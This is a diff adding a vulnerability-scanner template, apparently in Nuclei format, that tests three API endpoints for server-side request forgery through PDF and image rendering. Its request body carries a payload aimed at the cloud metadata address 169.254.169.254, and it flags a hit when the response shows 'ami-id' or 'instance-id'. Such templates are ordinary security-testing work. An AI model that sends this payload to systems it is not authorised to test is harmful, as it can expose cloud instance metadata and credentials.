@@ -1,0 +1,30 @@
+id: whai-ssrf-pdf-generation
+
+info:
+  name: SSRF via PDF/Image Generation
+  author: whitehat-ai
+  severity: high
+  description: Tests SSRF through server-side rendering features
+  tags: ssrf,pdf,high
+  classification:
+    cwe-id: CWE-918
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/generate-pdf"
+      - "{{BaseURL}}/api/export"
+      - "{{BaseURL}}/api/render"
+
+    headers:
+      Content-Type: application/json
+
+    body: '{"url":"http://169.254.169.254/latest/meta-data/"}'
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+        condition: or
